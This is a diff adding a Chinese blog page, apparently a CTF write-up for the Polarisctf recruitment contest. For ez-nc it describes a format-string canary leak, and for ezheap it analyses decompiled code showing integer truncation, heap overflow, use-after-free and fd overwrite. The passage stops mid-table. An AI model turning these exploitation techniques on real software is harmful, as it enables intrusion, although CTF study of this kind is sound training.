+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-link-fill"></i>
+                  <span>Friends</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>Whoami</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>Grep</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="Light Mode"
+               data-label-dark="Dark Mode">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">Dark Mode</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/bg.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Polarisctf招新赛"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-23 20:53" pubdate>
+          2026年4月23日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          17k bytes
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          ETA: 143 min
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Polarisctf招新赛</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="ez-nc"><a href="#ez-nc" class="headerlink" title="ez-nc"></a>ez-nc</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774660348085-9bdacd69-f7dc-438c-87f1-46fe9ad8f8e7.png" srcset="/img/loading.gif" lazyload></p>
+<p>nc连一下？？？</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774660403396-3bd348ee-9ec7-41ce-b41a-e6aaab8910f8.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774660528453-11721a87-af03-4499-b691-0075488b7a74.png" srcset="/img/loading.gif" lazyload></p>
+<p>这是干什么</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774660549339-e4409bbb-db04-4453-b797-c9173cb82255.jpeg" srcset="/img/loading.gif" lazyload></p>
+<p>难道限制7byte，还会ban字符</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774661520421-bacedaab-e783-4b0f-bf53-debe8501dbce.png" srcset="/img/loading.gif" lazyload></p>
+<p>出题人怎么这么坏啊</p>
+<p>这到底在考什么</p>
+<p>格式化字符串？？？</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774661860800-b0268f9c-3a1a-42a8-98cd-1d17b44e956d.png" srcset="/img/loading.gif" lazyload></p>
+<p>wc,我是天才</p>
+<p>可以还原一下函数</p>
+<p>char buf[8]; </p>
+<p>scanf(“%7s”, buf); </p>
+<p>printf(buf);  </p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774662131949-a86ab225-ca64-43da-926c-5d7fba833a17.png" srcset="/img/loading.gif" lazyload></p>
+<p>出canary了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774662681196-558df258-4392-491b-9d0f-6abd0c20a97d.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774662709611-16c54691-c0c5-4edf-87fa-f0a49b27d62f.png" srcset="/img/loading.gif" lazyload></p>
+<p>%i$s</p>
+<p>这内存里也没flag啊</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774669900975-8b894788-7b13-4b44-ad6b-d6f5a7ad13ba.png" srcset="/img/loading.gif" lazyload></p>
+<table>
+<thead>
+<tr>
+<th><strong><font style="color:rgb(31, 31, 31);">字节序列</font></strong></th>
+<th><strong><font style="color:rgb(31, 31, 31);">含义</font></strong></th>
+<th><strong><font style="color:rgb(31, 31, 31);">解释</font></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;\x7fELF&lt;/font&gt;**</code></td>
+<td><strong><font style="color:rgb(31, 31, 31);">Magic Number</font></strong></td>
+<td><font style="color:rgb(31, 31, 31);">告诉系统：“我是一个 ELF 格式的可执行文件”。</font></td>
+</tr>
+<tr>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;\x02&lt;/font&gt;**</code></td>
+<td><strong><font style="color:rgb(31, 31, 31);">Class</font></strong></td>
+<td><font style="color:rgb(31, 31, 31);">代表 </font><strong><font style="color:rgb(31, 31, 31);">64 位</font></strong><font style="color:rgb(31, 31, 31);">（如果是 </font><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;\x01&lt;/font&gt;</code><br/><font style="color:rgb(31, 31, 31);"> 则代表 32 位）。</font></td>
+</tr>
+<tr>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;\x01&lt;/font&gt;**</code></td>
+<td><strong><font style="color:rgb(31, 31, 31);">Data</font></strong></td>
+<td><font style="color:rgb(31, 31, 31);">代表 </font><strong><font style="color:rgb(31, 31, 31);">小端序（Little Endian）</font></strong><font style="color:rgb(31, 31, 31);">，这是 x86 架构的标准。</font></td>
+</tr>
+<tr>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;\x01&lt;/font&gt;**</code></td>
+<td><strong><font style="color:rgb(31, 31, 31);">Version</font></strong></td>
+<td><font style="color:rgb(31, 31, 31);">ELF 文件的版本，通常固定为 </font><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;01&lt;/font&gt;</code><br/><font style="color:rgb(31, 31, 31);">。</font></td>
+</tr>
+</tbody></table>
+<p>ez-nc的文件头</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774670081760-5fecf51c-2fe0-421c-8364-bfe99a03ab23.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774669741522-8b281994-fb48-4afa-8833-aa3f16e415b4.png" srcset="/img/loading.gif" lazyload></p>
+<p>有点奇怪的题</p>
+<h2 id="ezheap"><a href="#ezheap" class="headerlink" title="ezheap"></a>ezheap</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774670545491-e1d19886-5c83-4278-bae6-641fd990a4ba.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774670566551-a0f1a831-db86-45de-ab8a-72fcc22e873c.png" srcset="/img/loading.gif" lazyload></p>
+<p>有seccomp</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774670644740-ab93c594-b2fd-49fb-b7c8-ae8c5e0dcdf8.png" srcset="/img/loading.gif" lazyload></p>
+<p>ban 了execve和execveat</p>
+<p>用orw</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774675249077-28076ab7-caf5-46b2-815a-8c060fd12f13.png" srcset="/img/loading.gif" lazyload></p>
+<p>c++编译</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774670730831-706e6f31-fcc3-4841-bb19-12eefb2bbcf9.png" srcset="/img/loading.gif" lazyload></p>
+<p>全开</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774670782283-8e13ab7a-2598-4976-b8c9-0f9ee7db6b4a.png" srcset="/img/loading.gif" lazyload></p>
+<p>我去，2.39</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774673661438-08393e53-d129-4a81-84ab-a827a4c8a428.png" srcset="/img/loading.gif" lazyload></p>
+<p>有backdoor function，那还用个蛋的orw</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774673687799-40889045-8349-4824-98ad-75fb81a1e2d1.jpeg" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774682062772-c862bccc-f96e-4eaa-9c91-766019d6bbe5.png" srcset="/img/loading.gif" lazyload></p>
+<p>这笔记看着就高级</p>
+<p>翻译一下</p>
+<table>
+<thead>
+<tr>
+<th><strong><font style="color:rgb(31, 31, 31);">编号</font></strong></th>
+<th><strong><font style="color:rgb(31, 31, 31);">选项名称</font></strong></th>
+<th><strong><font style="color:rgb(31, 31, 31);">翻译</font></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong><font style="color:rgb(31, 31, 31);">[1]</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">Register model artifact</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">注册模型产物</font></strong></td>
+</tr>
+<tr>
+<td><strong><font style="color:rgb(31, 31, 31);">[2]</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">Stream artifact chunk</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">流式传输产物分片</font></strong></td>
+</tr>
+<tr>
+<td><strong><font style="color:rgb(31, 31, 31);">[3]</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">Bootstrap async scheduler</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">引导异步调度器</font></strong></td>
+</tr>
+<tr>
+<td><strong><font style="color:rgb(31, 31, 31);">[4]</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">Inspect scheduler queue</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">检查调度队列</font></strong></td>
+</tr>
+<tr>
+<td><strong><font style="color:rgb(31, 31, 31);">[5]</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">Allocate session tensor</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">分配会话张量</font></strong></td>
+</tr>
+<tr>
+<td><strong><font style="color:rgb(31, 31, 31);">[6]</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">Complete batch inference</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">完成批处理推理</font></strong></td>
+</tr>
+<tr>
+<td><strong><font style="color:rgb(31, 31, 31);">[7]</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">Patch session metadata</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">修复&#x2F;更新会话元数据</font></strong></td>
+</tr>
+<tr>
+<td><strong><font style="color:rgb(31, 31, 31);">[8]</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">Provision worker profile</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">配置工作节点配置文件</font></strong></td>
+</tr>
+<tr>
+<td><strong><font style="color:rgb(31, 31, 31);">[9]</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">Dispatch async task</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">派遣异步任务</font></strong><font style="color:rgb(31, 31, 31);">。</font></td>
+</tr>
+<tr>
+<td><strong><font style="color:rgb(31, 31, 31);">[10]</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">Runtime telemetry</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">运行时遥测</font></strong></td>
+</tr>
+<tr>
+<td><strong><font style="color:rgb(31, 31, 31);">[11]</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">Operator handbook</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">操作员手册</font></strong></td>
+</tr>
+<tr>
+<td><strong><font style="color:rgb(31, 31, 31);">[0]</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">Shutdown gateway</font></strong></td>
+<td><strong><font style="color:rgb(31, 31, 31);">关闭网关</font></strong></td>
+</tr>
+</tbody></table>
+<p>根本看不懂</p>
+<p>这出题人怎么这么坏啊</p>
+<p>•᷄ࡇ•᷅</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774685233030-088fd31c-4b9e-4798-9cd3-853a70258036.png" srcset="/img/loading.gif" lazyload></p>
+<p>什么叫main函数里还有加密？？？</p>
+<p>不对，不是加密，这是自校验</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774696897127-0d41be2a-50ee-4553-875f-177b781804d8.png" srcset="/img/loading.gif" lazyload></p>
+<p>底下这一块才是要看的</p>
+<p>兮，这c++反汇编我还不太看的懂</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774697365603-5116cd8e-268b-47b3-a5fb-8b9517838961.jpeg" srcset="/img/loading.gif" lazyload></p>
+<p>慢慢看了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774750577606-8624cf13-f570-4508-91c7-0393056010e5.jpeg" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774750675570-1d5149d4-f3ca-4810-93e3-3a036f214782.png" srcset="/img/loading.gif" lazyload></p>
+<p>先清零buf 376+16字节</p>
+<p>malloc 了0x200,512bytes</p>
+<p>v23 &#x3D; begin , v29&#x3D;the chunk’s end</p>
+<p><code>*(__m128i *)&amp;buf[376] = _mm_unpacklo_epi64((__m128i)v23, (__m128i)v23);</code></p>
+<p> 将两个 64 位整数交叉组合成一个 128 位的向量  </p>
+<p> 两个参数都是v23,故高64低64都是v23</p>
+<p>sub_8A60 和 sub_3570：传入了 buf 的起始地址</p>
+<p>先看看8a60</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774751523514-8d51dcf9-3456-414a-b325-f079901f77f9.png" srcset="/img/loading.gif" lazyload></p>
+<p>控制台这一块</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774751858769-ba97400b-74c7-42d3-834b-68e7ddfbd626.png" srcset="/img/loading.gif" lazyload></p>
+<p>ban execve</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774752105599-bdd0f60e-0f2f-4d8e-b094-3246a2173ddc.png" srcset="/img/loading.gif" lazyload></p>
+<p>buf共用</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774752220570-bba01268-4b3b-497a-addd-556ad38e0bb2.png" srcset="/img/loading.gif" lazyload></p>
+<p>用来int (str)的</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774752378273-755191d3-0f7e-46b7-abfc-518f9e633cee.png" srcset="/img/loading.gif" lazyload></p>
+<p>8a60结束后free buf的,6720也是</p>
+<p>看看case1</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774754289045-ee6970d0-d776-4e5d-bb4e-f54407855752.png" srcset="/img/loading.gif" lazyload></p>
+<p>calloc</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774754354684-9f3ebdb6-59bb-4662-88c4-58a9bd0bd70f.png" srcset="/img/loading.gif" lazyload></p>
+<p>打印calloc的返回地址</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774754913994-de313bc0-6a32-4e6d-887f-c23ff92daced.png" srcset="/img/loading.gif" lazyload></p>
+<p>单个输入 <code>v9</code> (items) 和 <code>v42</code> (stride) 被限制在 32 位以内</p>
+<p> n32_1 &#x3D; (std::ios_base *)(v42 * v9);  </p>
+<p>乘积被存入了 64 位的 n32_1 中  </p>
+<p> n32 &#x3D; (unsignedint)n32_1;  </p>
+<p>强制将 64 位的 n32_1 转换为 32 位的 unsigned int  </p>
+<p> v13 &#x3D; calloc(n32, 1uLL);  </p>
+<p>使用截断后的 32 位小数值去分配堆内存  </p>
+<p>存在 Integer Truncation  （高位砍掉）</p>
+<p>这样就可以伪造所记录的calloc的chunk大小</p>
+<p>看看case2</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774756590998-4d1cd9fb-87cf-4100-b03f-8377f70e98ee.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 1. 获取 Case 1 中记录的 64 位 chunk size</span><br>n0x5F_1 = *(_QWORD *)(buf + <span class="hljs-number">16</span>); <br><span class="hljs-comment">// 2. 获取输入的 offset</span><br>n0x5F_2 = n0x5F; <br><span class="hljs-comment">// 3. 尺寸检查</span><br><span class="hljs-keyword">if</span> ( n0x5F &gt;= n0x5F_1 ) &#123;<br>    <span class="hljs-comment">// 如果 offset 大于等于记录的大小，则报错</span><br>    <span class="hljs-built_in">std</span>::__ostream_insert(..., <span class="hljs-string">&quot;stream exceeds declared artifact size&quot;</span>, ...);<br>&#125; <br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 4. 窗口策略检查</span><br>    <span class="hljs-keyword">if</span> ( n0x5F &lt;= <span class="hljs-number">0x5F</span> ) &#123; <span class="hljs-comment">// 0x5F = 95</span><br>        <span class="hljs-comment">// 将 payload 拷贝到 arena_ptr + offset 的位置</span><br>        <span class="hljs-comment">// 限制条件：offset &lt;= 95</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>看看case3</p>
+<p>什么叫**<font style="color:rgb(31, 31, 31);">引导异步调度器</font>**</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774757522456-f4c0202b-b96d-4c22-b8e8-9117f86d47fd.jpeg" srcset="/img/loading.gif" lazyload></p>
+<p> 启动后台的任务分发系统  </p>
+<p><strong>创建总控台（Scheduler Control Plane）</strong>：分配一个全局的调度器控制块（<code>queue_ctrl</code>），里面记录了调度器的状态，并且<strong>初始化了安全策略（</strong><code>**strict_policy**</code>** &#x3D; 1）**</p>
+<p><strong>创建任务槽（Task Descriptors）：循环 8 次，创建 8 个任务结构体（Task 0 到 Task 7）。每个结构体里预先填好了默认的</strong>回调函数指针（handler）<strong>和参数（context）</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 1. 分配控制块 (防火墙开关)</span><br>v10 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x38</span>);                    <span class="hljs-comment">// 实际会分配出 0x40 大小的物理堆块</span><br>*((_WORD *)v10 + <span class="hljs-number">4</span>) = <span class="hljs-number">257</span>;             <span class="hljs-comment">// 在偏移 +0x08 的位置，写入了 strict_policy = 1</span><br>*(_QWORD *)(a1 + <span class="hljs-number">32</span>) = v10;            <span class="hljs-comment">// 把指针挂载到全局上下文 a1(buf) 上</span><br><br><span class="hljs-comment">// 2. 循环分配 8 个任务块 (执行流入口)</span><br><span class="hljs-keyword">while</span> ( n7 != <span class="hljs-number">8</span> ) <br>&#123;<br>    v15 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x50</span>);                <span class="hljs-comment">// 实际会分配出 0x60 大小的物理堆块</span><br>    *((_QWORD *)v15 + <span class="hljs-number">3</span>) = sub_30A0;   <span class="hljs-comment">// 在偏移 +0x18 的位置，写入了默认的函数指针</span><br>    *((_QWORD *)v15 + <span class="hljs-number">4</span>) = v15;        <span class="hljs-comment">// 在偏移 +0x20 的位置，写入了参数指针</span><br>    <br>    <span class="hljs-comment">// 把 Task 指针挂载到全局上下文 a1(buf) 偏移 +40 开始的数组中</span><br>    *(_QWORD *)(a1 + <span class="hljs-number">8</span> * n7 + <span class="hljs-number">40</span>) = v15; <br>    ++n7;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774761522017-56d07ec9-6fb4-4572-9054-c090eb5ab21f.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以通过case2的溢出覆盖v10</p>
+<p>看看case4</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775132009577-782ba51a-a226-4606-b8aa-05b90c2068fa.png" srcset="/img/loading.gif" lazyload></p>
+<p>4可以泄露addr</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774765018869-d9312826-f34c-4622-828a-e0e6e5f71747.png" srcset="/img/loading.gif" lazyload></p>
+<p>看看case5</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 1. 校验 Slot 是否已被占用 (n0xF 为 0-15)</span><br><span class="hljs-comment">// a1 + 104 (0x68) 处开始存指针数组</span><br><span class="hljs-keyword">if</span> ( *(_QWORD *)(a1 + <span class="hljs-number">8</span> * n0xF + <span class="hljs-number">104</span>) ) <br>&#123;<br>    <span class="hljs-built_in">std</span>::__ostream_insert(..., <span class="hljs-string">&quot;session slot already allocated&quot;</span>, ...);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">// 2. 分配 Session 核心对象 (申请 0x50, 实际分配 0x60 的堆块)</span><br>v11 = operator new(<span class="hljs-number">0x50u</span>LL);<br>*(_QWORD *)v11 = n0xF;                <span class="hljs-comment">// +0x00: 存入 slot 号</span><br>*(_DWORD *)(v11 + <span class="hljs-number">4</span>) = size;          <span class="hljs-comment">// +0x04: 存入 tensor_bytes 大小</span><br><br><span class="hljs-comment">// 3. 分配 Payload 缓冲区</span><br><span class="hljs-keyword">if</span> ( size ) <br>&#123;<br>    v14 = <span class="hljs-built_in">malloc</span>(size);               <span class="hljs-comment">// 根据输入的大小分配数据区</span><br>    *((_QWORD *)v11 + <span class="hljs-number">1</span>) = v14;       <span class="hljs-comment">// +0x08: payload_ptr (数据指针)</span><br>&#125;<br><br><span class="hljs-comment">// 4. 初始化别名 (alias) 与回调函数</span><br>__snprintf_chk(v11 + <span class="hljs-number">16</span>, <span class="hljs-number">32LL</span>, ... , <span class="hljs-string">&quot;%s&quot;</span>, alias); <span class="hljs-comment">// +0x10: 32 字节的 alias 字符串</span><br>*((_QWORD *)v11 + <span class="hljs-number">7</span>) = sub_2C50;      <span class="hljs-comment">// +0x38: postproc_func (默认函数指针)</span><br><br><span class="hljs-comment">// 5. 登记到全局上下文 (a1 为 392 字节的 buf)</span><br>*(_QWORD *)(a1 + <span class="hljs-number">8</span> * n0xF + <span class="hljs-number">104</span>) = v11; <span class="hljs-comment">// 登记对象指针到 buf[0x68 + slot*8]</span><br>*(_BYTE *)(a1 + n0xF + <span class="hljs-number">360</span>) = <span class="hljs-number">1</span>;        <span class="hljs-comment">// 将 active 标志位置 1 (buf[0x168 + slot])</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>case6</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774765502719-e183e343-5d52-4c25-913a-b85b0efa3dd2.png" srcset="/img/loading.gif" lazyload></p>
+<p>UAF</p>
+<p>看看case7</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774765906170-9c8a2d0a-61f3-4a2c-a0f8-b6aafcf16179.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以用它改fd</p>
+<p>这就是edit</p>
+<p>看看case8</p>
+<p> Case 8 表面上是一个配置节点的业务功能，但在 Pwn 攻击链中，它是一个<strong>无损的 64 位任意内存内容填充器</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong><font style="color:rgb(31, 31, 31);">物理内存偏移</font></strong></th>
+<th><strong><font style="color:rgb(31, 31, 31);">Case 8 以为它在写什么？ (Worker Profile)</font></strong></th>
+<th><strong><font style="color:rgb(31, 31, 31);">实际传入的 Payload</font></strong></th>
+<th><strong><font style="color:rgb(31, 31, 31);">Case 9 以为它在读什么？ (Task Descriptor)</font></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;+0x00&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;cpu_quota&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;0&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;task_id&lt;/font&gt;</code></td>
+</tr>
+<tr>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;+0x08&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;mem_quota&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;0&lt;/font&gt;</code></td>
+<td><font style="color:rgb(31, 31, 31);">状态字段 &#x2F; 占位</font></td>
+</tr>
+<tr>
